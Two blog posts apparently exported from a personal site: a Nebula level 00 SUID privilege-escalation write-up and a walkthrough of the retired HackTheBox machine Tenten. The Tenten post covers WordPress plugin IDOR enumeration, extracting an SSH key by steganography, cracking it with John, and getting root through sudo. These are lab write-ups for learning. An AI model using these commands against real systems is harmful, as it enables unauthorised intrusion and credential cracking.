[{"content":"Depress and isolating from other human person create a huge amount of free time for me to pursue further my passion in Cybersecurity. This time, i alocate some of it to write about my Exploit-Exercise whih you can found here\nBasically, exploit exercise have 3 main exercise which are Nebula, Protostar and Fusion. Nebula is focusing more on Privilege Escalation in Linux.\nLevel 00 Questions Alternatively, look at the find man page. To access this level, log in as level00 with the password of level00.\nLab setup First, lets login to the machine. Since i setup the lab on VMWare Workstation, i just put the machine behind NAT connection and scan the network using netdiscover.\nConnect via ssh Login using level00:level00 on ssh and we are in into the machine now.\nLets get started The first level on Nebula would be very basic Linux Privilege Escalation technique. Lets try to use find / -user flag00 -perm -4000\nQuick rundown on the command, find is the tools you can found on linux, just like locate and ls. Then, / is on the next queue which indicate that find will crawl over the root / of the filesystem.\nSince the instruction needed us to execute this on behalf of flag00, here we just indicate -user flag00 and its following permission -perm plus the value of setuid and octal of -4000.\nNow, this will create a pile of hateful output, we can filter this using -print 2\u0026gt; /dev/null. /dev/null is kinda black hole in Linux and redirect anything to it can create nice and neat filter.\nOk, we have found the binary, lets run it and get our flag shall we.\n6710313549ba4d07a1a929854c8d0ec2.png\u0026rdquo;\nWe are already become user flag00 and lets just execute getflag to get the flag and move to next level.\nExploited we managed to exploit this and reach our target\nConclusion  SUID is awesome  Reference  https://www.linuxnix.com/suid-set-suid-linuxunix/  ","description":"Exploit-Exercise level 00 writeup","id":0,"section":"posts","tags":["pentest","nebula","exploit-exercise"],"title":"Nebula level 00","uri":"https://www.faizul.me/posts/exploit-exercise/level-00/"},{"content":" 10.10.10.10  Recon Nmap As usual, i will enum this machine with nmap first\nsudo nmap -sSCV -A --script vuln -T4 -oA nmap/agressive-vuln-scan -iL ip\nThe summarized of the nmap scan is that only 2 port are available for attacking which are http 80 and 22 ssh. Once we went to the browser and visit the ip, we will b greeted by this wordpress site.\nSince it is a wordpress site, i will usually skip gobuster and nikto and straight to wpscan.\nWpscan For wpscan, main two things to enumerate are plugin and user. Plugins in wordpress is really important because outdated plugin left unpatched will open attacking surfaces for wordpress.\nenumerate user\nwpscan --url http://10.10.10.10 --enumerate u -o wpscan/enumerate-user\nUser enumeration for this site gave user takis as result.\n[i] User(s) Identified: [+] takis | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://10.10.10.10/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) enum plugin\nwpscan --url http://10.10.10.10 --enumerate p -o wpscan/enumerate-plugin\nFor plugin, we have one unpatched which is job-manager.\n[i] Plugin(s) Identified: [+] job-manager | Location: http://10.10.10.10/wp-content/plugins/job-manager/ | Latest Version: 0.7.25 (up to date) | Last Updated: 2015-08-25T22:44:00.000Z | | Found By: Urls In Homepage (Passive Detection) | | [!] 1 vulnerability identified: | | [!] Title: Job Manager \u0026lt;= 0.7.25 - Insecure Direct Object Reference (IDOR) | References: | - https://wpvulndb.com/vulnerabilities/8167 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6668 | - https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/ | | Version: 7.2.5 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://10.10.10.10/wp-content/plugins/job-manager/readme.txt Initial Foothold / Initial access In order to get initial access, we need to understand the flow and connection of plugin to the web application function here.\nSince we foun the job-manager plugin left unpatched, i manually crawl the web app manually to enumerate more.\nOn the homepage, there is one hyperlink text to the open vacancies to the other page.\nThe Pentester job vacancy page have form which we can upload file and this can be leverage into RFI where we upload reverse shell payload on it. The form also can be tested for XSS and SQLi attack.\nBut first, lets take a look at vacancy url http://10.10.10.10/index.php/jobs/apply/8/. This url where it includes the the id os a post indicates that this might contain some other values.\nwhen we change the url into other value, the post changes.\nhttp://10.10.10.10/index.php/jobs/apply/8/\nFor this one, we can get to dig more by writing simple bash script to do enumeration.\ncurl -s http://10.10.10.10 | grep '\u0026lt;title\u0026gt;'\nWe turn this into loop and full bash script for enum.\n1 2 3 4 5 6  #!/bin/bash  for i in $(seq 1 20) do echo -n \u0026#34;$i: \u0026#34; curl -s http://10.10.10.10/index.php/jobs/apply/$i/ | grep \u0026#39;\u0026lt;title\u0026gt;\u0026#39;   Now we have the list, we can create custom wordlist for bruteforcing to confirm the file on wp-upload dir.\nTo do this, we can use cat exploit/enum-more.txt | cut -d \u0026quot; \u0026quot; -f 4 where this will give output\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  Hello Sample Auto \u0026amp;#8211; Jobs Job Register Pen Application cube Application HackerAccessGranted Application index \u0026amp;#8211; \u0026amp;#8211; \u0026amp;#8211; \u0026amp;#8211; \u0026amp;#8211;   Now, i will just tee this into new file and run gobuster against the 2017/04 folder.\ncat exploit/enum-more.txt | cut -d \u0026quot; \u0026quot; -f 4 | tee loot/custom-wordlist.txt\ngobuster dir -u http://10.10.10.10/wp-content/uploads/2017/04 -w loot/custom-wordlist.txt -x png,jpg,jpeg -o gobsuter/enum-custom-wordlist\n=============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.10/wp-content/uploads/2017/04 [+] Threads: 10 [+] Wordlist: loot/custom-wordlist.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: jpeg,png,jpg [+] Timeout: 10s =============================================================== 2020/08/31 08:52:12 Starting gobuster =============================================================== /cube.png (Status: 200) /HackerAccessGranted.jpg (Status: 200) =============================================================== 2020/08/31 08:52:22 Finished =============================================================== Now, we going to see what is this cube and HackerAccessGranted file about.\ncube\nHackerAccessGranted\nDownload this and we going to dissect hidden strings or anything inside.\nStrings\nSince there is no hidden strings on the file, we should use another tools called steghide.\nBasically, the image contain hidden stego function of private key ssh to the victim machine. To crack the password, we can use ssh2john and crack it using JohnTheRipper.\nFirst , we change the current private key into john format\npython /usr/share/john/ssh2john id_rsa \u0026gt; john-id_rsa\nFor future reference, the john format and normal private key format is different as shown below\nThen we can crack this using this command\nsudo john john-id_rsa --fork=4 -w /usr/share/wordlist/rockyou.txt\nWe cracked the password, it is superpassword.\nWe now try to login using the private key and cracked password as enumerated user we done earlier.\nssh -i id_rsa takis@10.10.10.10\nWe are in the system as user takis and got the user flag.\nPrivilege Escalation In order to root, we can check the permission or any special permission that user takis can do using sudo -l.\nBasically, takis can run this special /bin/fuckin on ALL command without password. Let us see what this binary contain\nSo, it can accept up to 4 arguments command. Lets try to run this as sudo and execute bash.\nsudo /bin/fuckin bash\nIt works! We are now running as root.\nSummary ","description":"Tenten Machine Writeup","id":1,"section":"posts","tags":["pentest","retired","hackthebox"],"title":"Tenten - Retired HackTheBox Machine","uri":"https://www.faizul.me/posts/hackthebox/tenten/tenten-machine/"}]